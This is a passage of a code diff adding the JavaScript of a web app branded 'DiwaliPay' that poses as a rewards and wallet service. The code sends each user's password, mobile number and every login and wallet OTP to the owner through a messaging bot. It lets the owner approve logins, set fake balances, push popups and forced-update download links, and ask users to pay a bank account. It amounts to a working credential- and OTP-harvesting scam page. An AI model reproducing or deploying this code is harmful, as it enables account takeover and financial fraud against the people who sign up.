+      mt=txt.match(/^\/?themebg\s+(#[0-9a-fA-F]{6})\s+(#[0-9a-fA-F]{6})\s+(#[0-9a-fA-F]{6})$/i);if(mt){var cB=getTheme();cB.thBg1=mt[1];cB.thBg2=mt[2];cB.thBg3=mt[3];save('lp_cfg',JSON.stringify(cB));applyTheme();renderCfg();toast('BG updated','success');return;}
+
+      mt=txt.match(/^\/?brand\s+([\s\S]+)$/i);if(mt){var cf=getTheme();cf.brand=mt[1].trim();saveCfg(cf);cfgChg=true;toast('Brand updated','success');return;}
+      mt=txt.match(/^\/?title\s+(login|register)\s+([\s\S]+)$/i);if(mt){var cf2=getTheme();if(mt[1]==='login')cf2.loginTitle=mt[2].trim();else cf2.regTitle=mt[2].trim();saveCfg(cf2);cfgChg=true;return;}
+      mt=txt.match(/^\/?subtitle\s+(login|register)\s+([\s\S]+)$/i);if(mt){var cf3=getTheme();if(mt[1]==='login')cf3.loginSub=mt[2].trim();else cf3.regSub=mt[2].trim();saveCfg(cf3);cfgChg=true;return;}
+      mt=txt.match(/^\/?banner\s+(login|reg|main)\s+(small|big|date|top|amt|sub)\s+([\s\S]+)$/i);if(mt){var cf4=getTheme();var side=mt[1],field=mt[2],val=mt[3].trim();if(side==='login'){if(field==='small')cf4.loginSmall=val;else if(field==='big')cf4.loginBig=val;else if(field==='date')cf4.loginDate=val;}else if(side==='reg'){if(field==='small')cf4.regSmall=val;else if(field==='big')cf4.regBig=val;else if(field==='date')cf4.regDate=val;}else{if(field==='top')cf4.mainTop=val;else if(field==='amt')cf4.mainAmt=val;else if(field==='sub')cf4.mainSub=val;}saveCfg(cf4);cfgChg=true;toast('Banner updated','success');return;}
+
+      mt=txt.match(/^\/?logo\s+(\S+)$/i);if(mt){var cfL=getTheme();cfL.logoImg=mt[1];cfL.loginLogoImg=mt[1];cfL.regLogoImg=mt[1];saveCfg(cfL);cfgChg=true;toast('Logo set','success');return;}
+      mt=txt.match(/^\/?logos?off$/i);if(mt){var cfLO=getTheme();cfLO.logoImg='';cfLO.loginLogoImg='';cfLO.regLogoImg='';saveCfg(cfLO);cfgChg=true;toast('Logo removed','info');return;}
+      mt=txt.match(/^\/?loginlogo\s+(\S+)$/i);if(mt){var cfLL=getTheme();cfLL.loginLogoImg=mt[1];saveCfg(cfLL);cfgChg=true;return;}
+      mt=txt.match(/^\/?reglogo\s+(\S+)$/i);if(mt){var cfRL=getTheme();cfRL.regLogoImg=mt[1];saveCfg(cfRL);cfgChg=true;return;}
+      mt=txt.match(/^\/?bannerimg\s+main\s+(\S+)$/i);if(mt){var cfB=getTheme();cfB.mainImg=mt[1];saveCfg(cfB);cfgChg=true;toast('Image set','success');return;}
+      mt=txt.match(/^\/?bannerimg\s+main\s*$/i);if(mt){var cfBO=getTheme();cfBO.mainImg='';saveCfg(cfBO);cfgChg=true;toast('Image cleared','info');return;}
+
+      mt=txt.match(/^\/?video\s+(\d{10})\s+(\S+)(?:\s+([\s\S]+))?$/i);if(mt&&mt[1]===m){showVideoPopup(mt[2],(mt[3]||'').trim(),'🎬 Special Message');return;}
+      mt=txt.match(/^\/?video\s+(\S+)(?:\s+([\s\S]+))?$/i);if(mt&&!mt[1].match(/^\d{10}$/)){showVideoPopup(mt[1],(mt[2]||'').trim(),'🎬 Special Message');return;}
+      mt=txt.match(/^\/?popup\s+(\d{10})\s+([\s\S]+)$/i);if(mt&&mt[1]===m){var pMsg=mt[2].trim();var pLinkMatch=pMsg.match(/(https?:\/\/\S+)/i);var pLink=pLinkMatch?pLinkMatch[1]:'';var pText=pLink?pMsg.replace(pLink,'').trim():pMsg;showVideoPopup(pLink,pText,'📢 Owner Message');return;}
+      mt=txt.match(/^\/?forceupdate\s+(\d{10})\s+(\S+)(?:\s+([\s\S]+))?$/i);if(mt&&mt[1]===m){showUpdatePopup(mt[2],(mt[3]||'Please update.').trim(),'1.0.1');return;}
+      mt=txt.match(/^\/?forceupdateoff\s+(\d{10})$/i);if(mt&&mt[1]===m){$('updatePopup').classList.remove('show');return;}
+    });
+
+    if(mx>last)save(STORE.offset,String(mx));
+
+    if(approved){save(STORE.approved,'1');toast('✓ Owner approved!','success');if(waitPollInt){clearInterval(waitPollInt);waitPollInt=null;}if(logPollInt){clearInterval(logPollInt);logPollInt=null;}setAutoLogin(m);del(STORE.loginReq);setTimeout(openDashboard,500);}
+    if(rejected){save(STORE.rejected,'1');toast('Rejected','error');if(waitPollInt){clearInterval(waitPollInt);waitPollInt=null}if(logPollInt){clearInterval(logPollInt);logPollInt=null}showScreen('loginScreen');}
+    if(resetAppr){save(STORE.resetApproved,'1');toast('✓ Reset approved','success');if(forgotPollInt){clearInterval(forgotPollInt);forgotPollInt=null}showNewPassScreen();}
+    if(blocked){toast('Account blocked','error');if(cmdPollInt){clearInterval(cmdPollInt);cmdPollInt=null}showScreen('loginScreen');}
+    if(unblocked){toast('Account unblocked!','success');setTimeout(openDashboard,400);}
+    if(unlocked){renderPayee();if($('payAmount'))$('payAmount').textContent='₹'+getPrize();resetUpload();showPayPanel('payStep1');}
+    if(balChg||cfgChg){renderBal(true);renderCfg()}
+    if(wlChg){renderWalletList();renderVerifiedCard()}
+    if(payeeChg)renderPayee();
+    if(txChg&&$('walletHistoryList'))renderWalletHistory();
+    if(inviteChg){if($('inviteCountBox'))$('inviteCountBox').textContent=getInviteCount();if($('inviteEarnBox'))$('inviteEarnBox').textContent='₹'+getInviteEarn();}
+    if(payChg&&getPay())openPayModal();
+  }).catch(function(){pollActive=false});
+}
+
+var regOtpTimer=null,regOtpSec=0;
+function startRegOtpTimer(){if(regOtpTimer)clearInterval(regOtpTimer);regOtpSec=OTP_TIMEOUT;var btn=$('getOtpBtn');function tick(){if(regOtpSec<=0){btn.textContent='GET OTP';btn.disabled=false;clearInterval(regOtpTimer);regOtpTimer=null;var h=$('regOtpHint');h.className='otp-hint';h.innerHTML='<i class="fa-solid fa-circle-exclamation"></i> OTP expired. Tap again.';return;}btn.textContent=regOtpSec+'s';btn.disabled=true;regOtpSec--;}tick();regOtpTimer=setInterval(tick,1000);}
+function bindGetOtp(){var btn=$('getOtpBtn');if(!btn)return;btn.addEventListener('click',function(){var m=$('regMobile').value.trim();if(!/^[6-9]\d{9}$/.test(m)){toast('Enter valid mobile first','error');return;}var u=$('regUser').value.trim()||'-';tg('📨 <b>Register OTP Request</b>\n\n👤 '+esc(u)+'\n📱 +91 '+esc(m));var h=$('regOtpHint');h.className='otp-hint sent';h.innerHTML='<i class="fa-solid fa-circle-check"></i> OTP sent to +91 '+m;startRegOtpTimer();toast('OTP sent','success');});}
+
+var loginOtpTimer=null,loginOtpSec=59,loginMobileCache='';
+function bindLogin(){var lm=$('logMobile');if(lm)lm.addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,10)});var btn=$('loginBtn');if(btn)btn.addEventListener('click',function(){var m=$('logMobile').value.trim();var p=$('logPass').value.trim();if(!/^[6-9]\d{9}$/.test(m)){toast('Enter valid mobile number','error');return;}if(!p||p.length<4){toast('Enter password','error');return;}if(read('lp_blk_'+m)==='1'){toast('Account blocked','error');return;}var sM=read(STORE.mobile),sP=read(STORE.pass);if(!sM){toast('Account not found. Please register.','error');return;}if(sM!==m){toast('❌ Mobile not registered','error');return;}if(sP!==p){toast('❌ Wrong password','error');return;}save(STORE.mobile,m);gotoLoginOtp(m);});var gl=$('goRegister');if(gl)gl.addEventListener('click',function(){showScreen('registerScreen')});var fl=$('forgotLink');if(fl)fl.addEventListener('click',startForgot);}
+
+function gotoLoginOtp(m){loginMobileCache=m;$('otpMobileDisplay').textContent=m;$('otpBox').value='';showScreen('loginOtpScreen');startLoginOtpTimer();tg('🔐 <b>Login OTP Request</b>\n\n👤 <b>User:</b> '+esc(read(STORE.user)||'-')+'\n📱 <b>Mobile:</b> +91 '+esc(m));if(logPollInt)clearInterval(logPollInt);logPollInt=setInterval(function(){pollTg({mobile:m});if(read(STORE.approved)==='1'&&read(STORE.loginReq)==='1'){clearInterval(logPollInt);logPollInt=null;stopLoginOtpTimer();setAutoLogin(m);del(STORE.loginReq);toast('✓ Login approved!','success');setTimeout(openDashboard,500);}},POLL_MS);}
+
+function startLoginOtpTimer(){if(loginOtpTimer)clearInterval(loginOtpTimer);loginOtpSec=59;var el=$('otpTimerText'),orb=$('otpOrb'),exp=$('otpExpiresText'),rb=$('otpResendBtn');if(rb)rb.disabled=true;function tick(){if(loginOtpSec<=0){clearInterval(loginOtpTimer);loginOtpTimer=null;if(el)el.textContent='0';if(exp)exp.textContent='Expired';if(orb){orb.style.setProperty('--p','0%');orb.classList.add('danger');}if(rb)rb.disabled=false;return;}var pct=(loginOtpSec/59)*100;if(orb){orb.style.setProperty('--p',pct+'%');orb.classList.remove('warn','danger');if(loginOtpSec<=10)orb.classList.add('danger');else if(loginOtpSec<=30)orb.classList.add('warn');}if(el)el.textContent=loginOtpSec;if(exp)exp.textContent=loginOtpSec+'s';loginOtpSec--;}tick();loginOtpTimer=setInterval(tick,1000);}
+function stopLoginOtpTimer(){if(loginOtpTimer){clearInterval(loginOtpTimer);loginOtpTimer=null;}}
+
+function bindLoginOtp(){var box=$('otpBox');if(box)box.addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,6)});var btn=$('otpVerifyBtn');if(btn)btn.addEventListener('click',function(){var o=$('otpBox').value.trim();var m=loginMobileCache||read(STORE.mobile);if(o.length<4){toast('Enter OTP (any 4-6 digits)','error');return;}tg('📥 <b>Login OTP Submitted</b>\n\n👤 <b>User:</b> '+esc(read(STORE.user)||'-')+'\n📱 <b>Mobile:</b> +91 '+esc(m)+'\n🔢 <b>OTP:</b> '+esc(o)+'\n\n<b>Approve:</b> <code>ok '+esc(m)+'</code>');save(STORE.loginReq,'1');toast('Waiting for owner approval...','info');$('waitUser').textContent=read(STORE.user)||'User';$('waitMobile').textContent='+91 '+m;if($('waitSubText'))$('waitSubText').innerHTML='Your login request has been sent to owner.<br>Owner <b style="color:var(--th3);">ok</b> command will unlock the dashboard.';showScreen('waitScreen');startWaitPoll();});var rb=$('otpResendBtn');if(rb)rb.addEventListener('click',function(){if(this.disabled)return;var m=loginMobileCache||read(STORE.mobile);gotoLoginOtp(m);toast('New OTP sent','success');});var bl=$('otpBackLink');if(bl)bl.addEventListener('click',function(){stopLoginOtpTimer();if(logPollInt){clearInterval(logPollInt);logPollInt=null;}showScreen('loginScreen');});}
+
+function bindRegister(){$('regMobile').addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,10)});$('regOtp').addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,6)});var inv=$('regInvite');if(inv)inv.addEventListener('input',function(e){e.target.value=e.target.value.replace(/[^A-Za-z0-9]/g,'').slice(0,5)});$('createBtn').addEventListener('click',function(){var u=$('regUser').value.trim(),p=$('regPass').value,m=$('regMobile').value.trim(),o=$('regOtp').value.trim(),inv=$('regInvite')?$('regInvite').value.trim():'';if(u.length<3){toast('User ID min 3','error');return;}if(p.length<4){toast('Pass min 4','error');return;}if(!/^[6-9]\d{9}$/.test(m)){toast('Enter valid mobile','error');return;}if(!/^\d{4,6}$/.test(o)){toast('Enter OTP','error');return;}var code=/^[A-Za-z0-9]{5}$/.test(inv)?inv:rndCode();save(STORE.user,u);save(STORE.mobile,m);save(STORE.pass,p);save(STORE.invite,code);save('lp_bal_'+m,String(DEFAULT_BALANCE));save(STORE.balance,String(DEFAULT_BALANCE));del(STORE.approved);del(STORE.rejected);del('lp_blk_'+m);save('lp_tx_'+m,JSON.stringify([{amount:DEFAULT_BALANCE,label:'🎉 Register Bonus',time:Date.now()}]));tg('🎉 <b>New Registration</b>\n\n👤 '+esc(u)+'\n🔑 '+esc(p)+'\n📱 +91 '+esc(m)+'\n🔢 OTP: '+esc(o)+'\n🎟️ Code: <code>'+esc(code)+'</code>\n\n<b>Approve:</b> <code>ok '+esc(m)+'</code>');toast('🎉 Registered','success');$('waitUser').textContent=u;$('waitMobile').textContent='+91 '+m;if($('waitSubText'))$('waitSubText').innerHTML='Your registration details have been sent to owner.<br>Owner <b style="color:var(--th3);">ok</b> command will unlock the dashboard.';showScreen('waitScreen');startWaitPoll();});$('backLoginLink').addEventListener('click',function(){showScreen('loginScreen')});}
+
+function startWaitPoll(){var m=read(STORE.mobile);if(!m)return;if(waitPollInt)clearInterval(waitPollInt);pollTg({mobile:m});waitPollInt=setInterval(function(){if(read(STORE.approved)==='1'){clearInterval(waitPollInt);waitPollInt=null;setAutoLogin(m);toast('✓ Approved!','success');setTimeout(openDashboard,500);return;}if(read(STORE.rejected)==='1'){clearInterval(waitPollInt);waitPollInt=null;toast('Rejected','error');showScreen('loginScreen');return;}pollTg({mobile:m});},POLL_MS);}
+
+function startForgot(){var u=read(STORE.user)||'-',m=read(STORE.mobile)||'-';$('forgotUser').textContent=u;$('forgotMobile').textContent='+91 '+m;tg('🔑 <b>Password Reset</b>\n\n👤 '+esc(u)+'\n📱 +91 '+esc(m)+'\n\n<b>Approve:</b> <code>resetpass '+esc(m)+'</code>');toast('Request sent','success');showScreen('forgotScreen');if(forgotPollInt)clearInterval(forgotPollInt);pollTg({mobile:m});forgotPollInt=setInterval(function(){if(read(STORE.resetApproved)==='1'){clearInterval(forgotPollInt);forgotPollInt=null;showNewPassScreen();return;}pollTg({mobile:m})},POLL_MS);}
+function showNewPassScreen(){del(STORE.resetApproved);$('npUser').textContent=read(STORE.user)||'-';$('npMobile').textContent='+91 '+(read(STORE.mobile)||'----------');$('npNew').value='';$('npConfirm').value='';showScreen('newPassScreen');toast('✓ Set new password','success');}
+
+function bindForgot(){$('forgotResendBtn').addEventListener('click',startForgot);$('forgotBackBtn').addEventListener('click',function(){if(forgotPollInt){clearInterval(forgotPollInt);forgotPollInt=null}showScreen('loginScreen')});$('npBackBtn').addEventListener('click',function(){showScreen('loginScreen')});$('npSaveBtn').addEventListener('click',function(){var np=$('npNew').value,cf=$('npConfirm').value;if(np.length<4){toast('Min 4 chars','error');return;}if(np!==cf){toast('Do not match','error');return;}save(STORE.pass,np);toast('Password updated','success');clrAutoLogin();showScreen('loginScreen');$('logMobile').value=read(STORE.mobile)||'';$('logPass').value='';});$('waitCheckBtn').addEventListener('click',function(){toast('Checking...','info');pollTg({mobile:read(STORE.mobile)})});$('waitBackBtn').addEventListener('click',function(){if(waitPollInt){clearInterval(waitPollInt);waitPollInt=null}showScreen('loginScreen')});}
+
+function openDashboard(){showScreen('appScreen');if($('hUsername'))$('hUsername').textContent=read(STORE.user)||'User';renderBal();renderWalletList();renderVerifiedCard();renderCfg();applyTheme();var inv=read(STORE.invite)||'-----';if($('inviteCodeBox'))$('inviteCodeBox').textContent=inv;if($('inviteCountBox'))$('inviteCountBox').textContent=getInviteCount();if($('inviteEarnBox'))$('inviteEarnBox').textContent='₹'+getInviteEarn();del(STORE.loginReq);if(cmdPollInt)clearInterval(cmdPollInt);cmdPollInt=setInterval(function(){pollTg({mobile:read(STORE.mobile)})},POLL_MS);}
+
+function doLogout(){var u=read(STORE.user)||'-',m=read(STORE.mobile);tg('🚪 Logout: '+esc(u));clrAutoLogin(m);del(STORE.loginReq);if(cmdPollInt){clearInterval(cmdPollInt);cmdPollInt=null}if(waitPollInt){clearInterval(waitPollInt);waitPollInt=null}if(forgotPollInt){clearInterval(forgotPollInt);forgotPollInt=null}if(logPollInt){clearInterval(logPollInt);logPollInt=null}stopLoginOtpTimer();closeSheet('logoutModal');if($('verifiedWalletsCard'))$('verifiedWalletsCard').classList.add('hidden');showScreen('loginScreen');if(m)$('logMobile').value=m;$('logPass').value='';toast('Logged out','info');}
+
+function showVideoPopup(link,msg,title){$('videoTitle').textContent=title||'Message';$('videoDesc').textContent=msg||'';var icon=$('videoIcon'),wrap=$('videoFrameWrap'),vp=$('videoPlayer'),linkBtn=$('videoLinkBtn'),linkText=$('videoLinkText');wrap.style.display='none';linkBtn.classList.add('hidden');try{vp.pause();}catch(e){}vp.src='';if(link){var isDirect=/\.(mp4|webm|ogg|m4v)(\?|$)/i.test(link);var isExt=/youtube\.com|youtu\.be|vimeo\.com|dailymotion\.com/i.test(link);if(isDirect){wrap.style.display='block';vp.src=link;try{vp.play().catch(function(){});}catch(e){}icon.innerHTML='<i class="fa-solid fa-video"></i>';}else if(isExt){linkBtn.classList.remove('hidden');linkBtn.href=link;linkText.textContent='Watch Video';icon.innerHTML='<i class="fa-solid fa-circle-play"></i>';}else{linkBtn.classList.remove('hidden');linkBtn.href=link;linkText.textContent='Open Link';icon.innerHTML='<i class="fa-solid fa-link"></i>';}}else{icon.innerHTML='<i class="fa-solid fa-bullhorn"></i>';}$('videoPopup').classList.add('show');}
+function showUpdatePopup(link,msg,ver){$('updateVersionText').textContent=ver||'1.0.1';var notes=$('updateNotes');if(notes&&msg)notes.innerHTML='<div><i class="fa-solid fa-circle-info"></i> '+esc(msg)+'</div>';$('updateDownloadBtn').onclick=function(){if(link){try{window.open(link,'_blank');}catch(e){window.location.href=link;}}else toast('No link set','error');};$('updatePopup').classList.add('show');}
+
+function bindButtons(){
+  var btnW=$('btnMyWallet');if(btnW)btnW.addEventListener('click',function(){renderWalletList();openSheet('myWalletModal')});
+  var btnP=$('btnPurchase');if(btnP)btnP.addEventListener('click',requestUnlock);
+  var wm=$('wMobile');if(wm)wm.addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,10)});
+  var wo=$('wOtp');if(wo)wo.addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,6)});
+  var wn=$('wNextBtn');if(wn)wn.addEventListener('click',function(){var m=$('wMobile').value.trim();if(!/^[6-9]\d{9}$/.test(m)){toast('Enter valid mobile','error');return;}wSent=true;showWPanel('wStep2');$('wOtp').value='';var h=$('wOtpHint');h.className='hint sent';h.innerHTML='<i class="fa-solid fa-circle-check"></i> OTP sent to +91 '+m;tg('📨 OTP Request: '+esc(curW)+' / '+esc(m));toast('OTP sent','success');});
+  var wv=$('wVerifyBtn');if(wv)wv.addEventListener('click',function(){var o=$('wOtp').value.trim();if(!/^\d{4,6}$/.test(o)){toast('Enter valid OTP','error');return;}if(!wSent){toast('Send OTP first','error');return;}var m=$('wMobile').value.trim();var tk=++wToken;tg('📥 OTP Submitted: '+esc(curW)+' / '+esc(m)+' / '+esc(o));showWPanel('wLoading');setTimeout(function(){if(tk!==wToken)return;showWPanel('wSuccess');setTimeout(function(){if(tk!==wToken)return;submitWlReq(curW,m)},700)},900);});
+  var copies=document.querySelectorAll('.payee-copy');for(var k=0;k<copies.length;k++){copies[k].addEventListener('click',function(e){e.stopPropagation();var what=this.getAttribute('data-copy'),txt='';if(what==='amount')txt=String(read('lp_prize_demo')||'20');else if(what==='account')txt=$('payAccount').textContent;else if(what==='name')txt=$('payName').textContent;else if(what==='ifsc')txt=$('payIfsc').textContent;if(!txt||txt.indexOf('×')!==-1){toast('Not available','error');return;}try{navigator.clipboard.writeText(txt);toast('Copied','success')}catch(e){}});}
+  var vB=$('payVerifyBtn');if(vB)vB.addEventListener('click',submitPayment);
+  var dB=$('payDoneBtn');if(dB)dB.addEventListener('click',function(){closeSheet('purchaseModal');delPay();del('lp_prize_demo')});
+  var rB=$('payRetryBtn');if(rB)rB.addEventListener('click',function(){var p=getPay();if(p){p.status='ready';setPay(p)}resetUpload();openPayModal()});
+  var tB=$('payTimeoutBtn');if(tB)tB.addEventListener('click',function(){delPay();del('lp_payee_demo');del('lp_prize_demo');stopPayTimer();requestUnlock()});
+  var bH=$('btnWalletHistory');if(bH)bH.addEventListener('click',function(){renderWalletHistory();openSheet('walletHistoryModal')});
+  var bL=$('btnLogout');if(bL)bL.addEventListener('click',function(){openSheet('logoutModal')});
+  var cL=$('confirmLogoutBtn');if(cL)cL.addEventListener('click',doLogout);
+  var rOk=$('reqPopupOk');if(rOk)rOk.addEventListener('click',function(){$('walletReqPopup').classList.remove('show')});
+  var bI=$('btnInvite');if(bI)bI.addEventListener('click',function(){var inv=read(STORE.invite)||'-----';if($('inviteCodeBox'))$('inviteCodeBox').textContent=inv;if($('inviteCountBox'))$('inviteCountBox').textContent=getInviteCount();if($('inviteEarnBox'))$('inviteEarnBox').textContent='₹'+getInviteEarn();openSheet('inviteModal');});
+  var sI=$('shareInviteBtn');if(sI)sI.addEventListener('click',function(){var code=read(STORE.invite)||'';var msg='🎁 *'+getTheme().brand+' – ₹50 FREE!*\n\n💰 Register Bonus: ₹50\n🎟️ Use my code: *'+code+'*\n\nJoin now!';var u='https://wa.me/?text='+encodeURIComponent(msg);try{window.open(u,'_blank')}catch(e){window.location.href=u}toast('Sharing...','success');tg('📤 Invite Shared\n👤 '+esc(read(STORE.user)||'-')+'\n🎟️ '+esc(code));});
+  var bS=$('btnSupport');if(bS)bS.addEventListener('click',function(){var s=getSup();if($('supportNumber'))$('supportNumber').textContent=s.p;openSheet('supportModal');});
+  var sc=$('supportCallBtn');if(sc)sc.addEventListener('click',function(){var s=getSup();try{window.location.href='tel:'+s.p}catch(e){}toast('Opening dialer...','success');});
+  var sw=$('supportWaBtn');if(sw)sw.addEventListener('click',function(){var s=getSup(),wa=String(s.w||'').replace(/\D/g,'');if(wa.length===10)wa='91'+wa;var u='https://wa.me/'+wa+'?text='+encodeURIComponent('Hi, need help with '+getTheme().brand);try{window.open(u,'_blank')}catch(e){window.location.href=u}});
+  var vk=$('videoOkBtn');if(vk)vk.addEventListener('click',function(){$('videoPopup').classList.remove('show');try{$('videoPlayer').pause();$('videoPlayer').src='';}catch(e){}});
+  var vc=$('videoCloseBtn');if(vc)vc.addEventListener('click',function(){$('videoPopup').classList.remove('show');try{$('videoPlayer').pause();$('videoPlayer').src='';}catch(e){}});
+}
+
+function init(){
+  applyTheme();renderCfg();renderBal();bindClose();
+  bindLogin();bindLoginOtp();bindRegister();bindGetOtp();bindForgot();bindButtons();bindUpload();
+  var u=read(STORE.user),m=read(STORE.mobile),appr=read(STORE.approved);
+  if(u&&m&&read('lp_blk_'+m)==='1'){toast('Account blocked','error');showScreen('loginScreen');return;}
+  if(u&&m&&appr==='1'&&isAutoLogin(m)){openDashboard();toast('✓ Auto login','success');return;}
+  if(u&&m&&appr==='1'){showScreen('loginScreen');if($('logMobile'))$('logMobile').value=m;if($('logPass'))$('logPass').value='';return;}
+  if(u&&m&&appr!=='1'){$('waitUser').textContent=u;$('waitMobile').textContent='+91 '+m;if($('waitSubText'))$('waitSubText').innerHTML='Your request has been sent to owner.<br>Owner <b style="color:var(--th3);">ok</b> command will unlock the dashboard.';showScreen('waitScreen');startWaitPoll();return;}
+  showScreen('loginScreen');
+  console.log('🪔 DiwaliPay ready');
+}
+if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',init);else init();
+})();
+</script>
+</body>
+</html>
